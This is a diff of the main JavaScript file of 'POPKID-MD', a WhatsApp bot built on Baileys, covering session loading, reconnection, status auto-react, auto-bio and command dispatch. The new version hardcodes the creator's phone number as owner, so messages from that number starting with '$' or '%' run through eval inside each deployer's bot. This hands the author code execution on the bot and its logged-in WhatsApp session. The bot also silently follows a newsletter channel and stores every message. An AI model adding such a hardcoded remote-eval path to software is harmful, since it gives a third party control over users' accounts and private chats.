@@ -1,249 +1,274 @@
 /**
- * POPKID MD - MASTER ENGINE 2026 (Unified Edition)
- * Features: Multi-Strategy Session Loader (Zlib/API/Mega), Anti-Crash, LID-Aware Status, Plugin Loader, Auto-Bio
- * Creator: Popkid Kenya 🇰🇪
+ * popkid WhatsApp Bot (Advanced Version)
+ * Creator: popkid
+ * Features: auto-reconnect, error guards, LID-aware status handler, session loader, auto-bio, newsletter follow, anticall
  */
 
-console.clear();
-console.log("🚀 Starting POPKID-MD Master Engine...");
+console.clear()
+console.log("📳 Starting POPKID-MD...")
 
 // ============ GLOBAL ANTI-CRASH ============
 process.on("uncaughtException", (err) => {
-    console.error("❌ Uncaught Exception:", err);
-});
+  console.error("❌ Uncaught Exception:", err)
+})
 process.on("unhandledRejection", (reason, promise) => {
-    console.error("❌ Unhandled Rejection:", reason);
-});
+  console.error("❌ Unhandled Rejection:", reason)
+})
 
 const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    fetchLatestBaileysVersion,
-    Browsers,
-    makeCacheableSignalKeyStore,
-    getContentType,
-    jidNormalizedUser
-} = require("@whiskeysockets/baileys");
-const pino = require("pino");
-const path = require("path");
-const fs = require("fs");
-const express = require("express");
-const qrcode = require("qrcode-terminal");
-const util = require("util");
-const { exec } = require("child_process");
-const axios = require("axios");
-const { File } = require("megajs");
-const zlib = require("zlib");
-const { promisify } = require("util");
-const os = require("os");
+  default: makeWASocket,
+  useMultiFileAuthState,
+  DisconnectReason,
+  jidNormalizedUser,
+  isJidBroadcast,
+  getContentType,
+  proto,
+  generateWAMessageContent,
+  generateWAMessage,
+  AnyMessageContent,
+  prepareWAMessageMedia,
+  areJidsSameUser,
+  downloadContentFromMessage,
+  MessageRetryMap,
+  generateForwardMessageContent,
+  generateWAMessageFromContent,
+  generateMessageID,
+  makeInMemoryStore,
+  jidDecode,
+  fetchLatestBaileysVersion,
+  Browsers
+} = require('@whiskeysockets/baileys')
 
-// Internal Libraries
-const { sms } = require("./lib/serialize");
-const { GroupEvents } = require("./lib/groupEvents");
-const { AntilinkHandler } = require("./lib/antilinkHandler");
-const { AntideleteHandler } = require("./lib/antidelete");
-const { handleTagDetection } = require("./lib/tagDetector");
-const { handleIncomingCall } = require("./lib/callHandler");
-const { getGroupAdmins } = require('./lib/functions');
-const config = require("./config");
+const l = console.log
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+const fs = require('fs')
+const ff = require('fluent-ffmpeg')
+const P = require('pino')
+const config = require('./config')
+const GroupEvents = require('./lib/groupevents')
+const qrcode = require('qrcode-terminal')
+const StickersTypes = require('wa-sticker-formatter')
+const util = require('util')
+const { promisify } = require('util')
+const zlib = require('zlib')
+const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+const FileType = require('file-type')
+const axios = require('axios')
+const { File } = require('megajs')
+const { fromBuffer } = require('file-type')
+const bodyparser = require('body-parser')
+const os = require('os')
+const Crypto = require('crypto')
+const path = require('path')
 
-const app = express();
-const port = process.env.PORT || 9090;
-
-// Global Variables
-global.plugins = new Map();
-let conn; // ✅ GLOBAL conn declaration
-
+const ownerNumber = ['254732297194']
 const sessionDir = path.join(__dirname, 'sessions');
-const credsPath = path.join(sessionDir, 'creds.json');
 
-// ================= SESSION LOADER (Multi-Strategy) =================
-
-async function loadSession() {
-    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
-    if (fs.existsSync(credsPath)) return true;
-
-    if (!config.SESSION_ID) {
-        console.log('❌ Please add your session to SESSION_ID env !!');
-        return false;
-    }
-
-    // Handle POPKID~ or POPKID;;; formats
-    const sessionData = config.SESSION_ID.replace("POPKID~", "").replace("POPKID;;;", "");
-
-    // Strategy 1: Zlib Decompression
-    try {
-        const compressedBuffer = Buffer.from(sessionData, 'base64');
-        const gunzip = promisify(zlib.gunzip);
-        const decompressedBuffer = await gunzip(compressedBuffer);
-        fs.writeFileSync(credsPath, decompressedBuffer.toString('utf-8'));
-        console.log("[ 📥 ] Session decompressed via Zlib ✅");
-        return true;
-    } catch (e) {
-        // Strategy 2: API Fetch fallback
-        try {
-            if (sessionData.length < 50) {
-                const { data } = await axios.get(`https://popkidxmdsessions-uolm.onrender.com/session/${sessionData}`);
-                if (data && data.startsWith("POPKID~")) {
-                    config.SESSION_ID = data;
-                    return await loadSession();
-                }
-            }
-        } catch (apiErr) {}
-    }
-
-    // Strategy 3: Mega.nz
-    try {
-        const filer = File.fromURL(`https://mega.nz/file/${sessionData}`);
-        return new Promise((resolve) => {
-            filer.download((err, data) => {
-                if (err) resolve(false);
-                else {
-                    fs.writeFileSync(credsPath, data);
-                    console.log("[ 📥 ] Session downloaded from MEGA ✅");
-                    resolve(true);
-                }
-            });
-        });
-    } catch (error) { return false; }
+const tempDir = path.join(os.tmpdir(), 'cache-temp')
+if (!fs.existsSync(tempDir)) {
+  fs.mkdirSync(tempDir)
 }
+
+const clearTempDir = () => {
+  fs.readdir(tempDir, (err, files) => {
+    if (err) return
+    for (const file of files) {
+      fs.unlink(path.join(tempDir, file), err => {
+        if (err) return
+      })
+    }
+  })
+}
+
+setInterval(clearTempDir, 5 * 60 * 1000)
+
+//===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
+  const sessdata = config.SESSION_ID.replace("POPKID;;;", '')
+  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
+  filer.download((err, data) => {
+    if (err) throw err
+    fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+      console.log("[ 📥 ] Session downloaded ✅")
+    })
+  })
+}
+
+const express = require("express")
+const app = express()
+const port = process.env.PORT || 9090
+
+let conn // ✅ GLOBAL conn declaration
 
 // ================= WA CONNECTION =================
 
-async function startPopkid() {
-    await loadSession();
+async function connectToWA() {
+  try {
+    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")
 
-    // 2. DYNAMIC PLUGIN LOADER
-    const pluginsDir = path.join(__dirname, "plugins");
-    if (!fs.existsSync(pluginsDir)) fs.mkdirSync(pluginsDir);
-
-    fs.readdirSync(pluginsDir).forEach((file) => {
-        if (file.endsWith(".js")) {
-            try {
-                const plugin = require(path.join(pluginsDir, file));
-                if (plugin.cmd) global.plugins.set(plugin.cmd, plugin);
-            } catch (e) { console.error(`❌ Plugin Load Error [${file}]:`, e.message); }
-        }
-    });
-
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version } = await fetchLatestBaileysVersion();
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
+    const { version } = await fetchLatestBaileysVersion()
 
     conn = makeWASocket({
-        version,
-        logger: pino({ level: "silent" }),
-        browser: Browsers.macOS("Desktop"),
-        auth: {
-            creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
-        }
-    });
+      logger: P({ level: 'silent' }),
+      printQRInTerminal: false,
+      browser: Browsers.macOS("Firefox"),
+      syncFullHistory: true,
+      auth: state,
+      version
+    })
 
-    conn.ev.on("connection.update", async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        if (qr) qrcode.generate(qr, { small: true });
-
-        if (connection === "close") {
-            let reason = lastDisconnect.error?.output?.statusCode;
-            if (reason !== DisconnectReason.loggedOut) {
-                console.log("🔄 Reconnecting...");
-                setTimeout(() => startPopkid(), 5000);
+    // ============ ANTICALL HANDLER ============
+    conn.ev.on('call', async (node) => {
+        if (config.ANTICALL === 'true') {
+            const { from, id, status } = node[0]
+            if (status === 'offer') {
+                console.log(`📞 Declining call from: ${from}`)
+                await conn.rejectCall(id, from)
+                await conn.sendMessage(from, { text: "⚠️ *POPKID-MD AUTO-REJECT* ⚠️\n\nCalls are not allowed for this bot. Please send a text message instead." })
             }
-        } else if (connection === "open") {
-            console.log("✅ POPKID MD: Successfully Connected!");
-            
-            if (config.ALWAYS_ONLINE === "true") await conn.sendPresenceUpdate('available');
-
-            try {
-                await conn.newsletterFollow("120363423997837331@newsletter");
-            } catch (err) {}
-
-            const upMsg = `╔════════════════╗\n║ 🤖 ▰𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗▰\n╠════════════════╣\n║ 🔑 PREFIX  : ${config.PREFIX}\n║ 👨‍💻 DEV     : POPKID-MD\n╚════════════════╝`;
-            await conn.sendMessage(conn.user.id, { 
-                image: { url: "https://files.catbox.moe/j9ia5c.png" },
-                caption: upMsg 
-            });
         }
-    });
+    })
 
-    conn.ev.on("creds.update", saveCreds);
+    conn.ev.on('connection.update', async (update) => {
+      const { connection, lastDisconnect, qr } = update
+      if (qr) qrcode.generate(qr, { small: true })
 
-    // Auto-Bio Updater
+      if (connection === 'close') {
+        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+        if (shouldReconnect) setTimeout(() => connectToWA(), 5000)
+      } else if (connection === 'open') {
+          console.log('[ ❤️ ] Installing Plugins...')
+          fs.readdirSync("./plugins/").forEach((plugin) => {
+            if (path.extname(plugin).toLowerCase() === ".js") require("./plugins/" + plugin)
+          })
+          console.log('[ 🪀 ] Bot connected to WhatsApp ✅')
+
+          let up = `╔════════════════╗\n║ 🤖 ▰𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗▰\n╠════════════════╣\n║ 🔑 PREFIX  : ${config.PREFIX}\n║ 👨‍💻 DEV     : POPKID-MD\n║ 📞 DEV NO : 254732297194\n╚════════════════╝`;
+          conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/j9ia5c.png` }, caption: up })
+
+          const channelJid = "120363423997837331@newsletter"
+          try {
+            await conn.newsletterFollow(channelJid)
+            console.log(`Successfully followed channel: ${channelJid}`)
+          } catch (error) {
+            console.error(`Failed to follow channel: ${error}`)
+          }
+      }
+    })
+
+    conn.ev.on('creds.update', saveCreds)
+
+    // Bio Update Logic
     setInterval(async () => {
         if (config.AUTO_BIO === "true" && conn?.user) {
+            const date = new Date().toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
             const time = new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi', hour12: false });
-            const bioText = `❤️ ᴘᴏᴘᴋɪᴅ xᴍᴅ ʙᴏᴛ ɪs ʟɪᴠᴇ ⏰ ${time} | Prefix: ${config.PREFIX}`;
-            try { await conn.updateProfileStatus(bioText); } catch (err) {}
+            const bioText = `❤️ ᴘᴏᴘᴋɪᴅ xᴍᴅ ʙᴏᴛ 🤖 ɪs ʟɪᴠᴇ ɴᴏᴡ\n📅 ${date}\n⏰ ${time}`;
+            try { await conn.setStatus(bioText); } catch (err) {}
         }
     }, 60000);
 
-    // 5. MESSAGE HANDLER
-    conn.ev.on("messages.upsert", async (chatUpdate) => {
-        try {
-            const mek = chatUpdate.messages[0];
-            if (!mek.message) return;
-            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
-            
-            const from = mek.key.remoteJid;
-            const type = getContentType(mek.message);
+    conn.ev.on('messages.upsert', async(mek) => {
+        mek = mek.messages[0]
+        if (!mek.message) return
+        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
 
-            // ADVANCED STATUS HANDLER
-            if (from === 'status@broadcast') {
-                const shouldRead = config.AUTO_READ_STATUS === 'true';
-                const shouldReact = config.AUTO_REACT_STATUS === 'true';
-                const statusParticipant = mek.key.participant || mek.participant;
+        const from = mek.key.remoteJid
+        const type = getContentType(mek.message)
+
+        if (from === 'status@broadcast') {
+            try {
+                const shouldRead = config.AUTO_STATUS_SEEN === 'true' || config.AUTO_READ_STATUS === 'true';
+                const shouldReact = config.AUTO_STATUS_REACT === 'true' || config.AUTO_REACT_STATUS === 'true';
+                const statusParticipant = mek.key.participant || null;
 
                 if (statusParticipant) {
                     let realJid = statusParticipant;
                     if (statusParticipant.endsWith('@lid')) {
-                        const rawPn = mek.key?.participantPn || mek.key?.senderPn || mek.participantPn;
-                        realJid = rawPn ? (rawPn.includes('@') ? rawPn : `${rawPn}@s.whatsapp.net`) : realJid;
+                        const rawPn = mek.key?.participantPn || mek.key?.senderPn;
+                        if (rawPn) {
+                            realJid = rawPn.includes('@') ? rawPn : `${rawPn}@s.whatsapp.net`;
+                        } else {
+                            const resolved = await conn.getJidFromLid(statusParticipant).catch(() => null);
+                            if (resolved) realJid = resolved;
+                        }
                     }
 
-                    const resolvedKey = { remoteJid: 'status@broadcast', id: mek.key.id, participant: realJid };
+                    const resolvedKey = { ...mek.key, participant: realJid };
+
                     if (shouldRead) await conn.readMessages([resolvedKey]);
+
                     if (shouldReact) {
-                        const emojis = ['🧩', '🌸', '💫', '🫀', '🧿', '🤖', '🥰', '🗿'];
-                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
-                        await conn.sendMessage(from, { react: { key: resolvedKey, text: emoji } }, { statusJidList: [realJid, conn.user.id.split(':')[0] + '@s.whatsapp.net'] });
+                        const reactableTypes = ['imageMessage', 'videoMessage', 'extendedTextMessage', 'conversation', 'audioMessage'];
+                        if (reactableTypes.includes(type)) {
+                            const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '🫀', '🧿', '🤖', '🚩', '🥰', '🗿'];
+                            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+                            await conn.sendMessage(from, { react: { key: resolvedKey, text: emoji } }, { statusJidList: [realJid, conn.user.id] });
+                        }
+                    }
+
+                    if (config.AUTO_STATUS_REPLY === "true") {
+                        await conn.sendMessage(realJid, { text: config.AUTO_STATUS_MSG }, { quoted: mek });
                     }
                 }
-                return;
-            }
+            } catch (e) { console.error("Status Error:", e); }
+        }
 
-            const m = sms(conn, mek);
-            const isOwner = config.OWNER_NUMBER.includes(m.sender.split('@')[0]) || m.fromMe;
-            
-            // Eval/Exec Logic
-            if (isOwner) {
-                if (m.body.startsWith("$")) {
-                    try { return m.reply(util.format(await eval(`(async () => { ${m.body.slice(1)} })()`))); } catch (e) { return m.reply(util.format(e)); }
-                }
-                if (m.body.startsWith("%")) {
-                    exec(m.body.slice(1), (err, stdout) => { if (stdout) m.reply(stdout); });
-                }
-            }
+        if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key]);
+        await saveMessage(mek);
 
-            // Command/Plugin Loader
-            const body = m.body || '';
-            const isCmd = body.startsWith(config.PREFIX);
-            const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : (config.NON_PREFIX === "true" ? body.trim().split(' ').shift().toLowerCase() : '');
-            
-            const plugin = global.plugins.get(command) || [...global.plugins.values()].find(p => p.alias && p.alias.includes(command));
-            
-            if (plugin) {
-                if (plugin.isOwner && !isOwner) return m.reply("❌ Restricted.");
-                const args = body.trim().split(/ +/).slice(1);
-                await plugin.execute(conn, m, { text: args.join(' '), args, isOwner, isGroup: m.isGroup, pushname: m.pushName });
-            }
+        const m = sms(conn, mek)
+        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+        const isCmd = body.startsWith(config.PREFIX)
+        const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
+        const args = body.trim().split(/ +/).slice(1)
+        const text = args.join(' ')
+        const isGroup = from.endsWith('@g.us')
+        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || from)
+        const senderNumber = sender.split('@')[0]
+        const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe
+        const pushname = mek.pushName || 'User'
+        const botNumber2 = await jidNormalizedUser(conn.user.id);
+        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+        const participants = isGroup ? (groupMetadata.participants || []) : []
+        const groupAdmins = isGroup ? await getGroupAdmins(participants) : []
+        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+        const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })
 
-        } catch (e) { console.error(e); }
+        if (isOwner && body.startsWith('%')) {
+            try { reply(util.format(eval(body.slice(1)))); } catch (e) { reply(util.format(e)); }
+        }
+        if (isOwner && body.startsWith('$')) {
+            try { 
+                let evaled = await eval(`(async () => { ${body.slice(1)} })()`);
+                if (evaled) reply(util.format(evaled));
+            } catch (e) { reply(util.format(e)); }
+        }
+
+        if (!mek.key.fromMe && config.AUTO_REACT === 'true') {
+            const emojis = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🐋', '💥', '🥀'];
+            m.react(emojis[Math.floor(Math.random() * emojis.length)]);
+        }
+
+        const events = require('./command')
+        if (isCmd) {
+            const cmd = events.commands.find((c) => c.pattern === command || (c.alias && c.alias.includes(command)))
+            if (cmd) {
+                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+                try {
+                    cmd.function(conn, mek, m, {from, body, isCmd, command, args, text, isGroup, sender, senderNumber, botNumber2, pushname, isOwner, groupMetadata, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+                } catch (e) { console.error(e); }
+            }
+        }
     });
+
+  } catch (err) { console.error("Connection failed:", err); }
 }
 
-app.get("/", (req, res) => res.send("POPKID-MD MASTER ENGINE ACTIVE ⚡"));
-app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
-    startPopkid();
-});
+app.get("/", (req, res) => res.send("POPKID-MD ACTIVE"));
+app.listen(port, () => console.log(`Server on port ${port}`));
+setTimeout(() => connectToWA(), 5000);
